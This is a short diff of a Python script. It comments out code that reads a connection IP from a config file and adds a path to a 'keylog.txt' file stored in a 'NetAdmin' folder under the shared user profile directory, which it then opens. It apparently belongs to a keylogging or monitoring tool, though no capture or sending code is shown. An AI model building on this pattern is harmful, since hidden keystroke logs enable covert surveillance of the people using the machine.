@@ -38,10 +38,14 @@
 #             if cv2.waitKey(25) & 0xFF == ord('q'):
 #                 cv2.destroyAllWindows()
 #                 break
-# bl()
-import configparser
+# # bl()
+# import configparser
+#
+# c = configparser.ConfigParser()
+# c.read_file(open('runconfig.ini'))
+# d = c['CONNECTION']['ip']
+# print(d)
+import os
 
-c = configparser.ConfigParser()
-c.read_file(open('runconfig.ini'))
-d = c['CONNECTION']['ip']
-print(d)
+KEYLOG_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylog.txt")
+open(KEYLOG_PATH, 'r+')
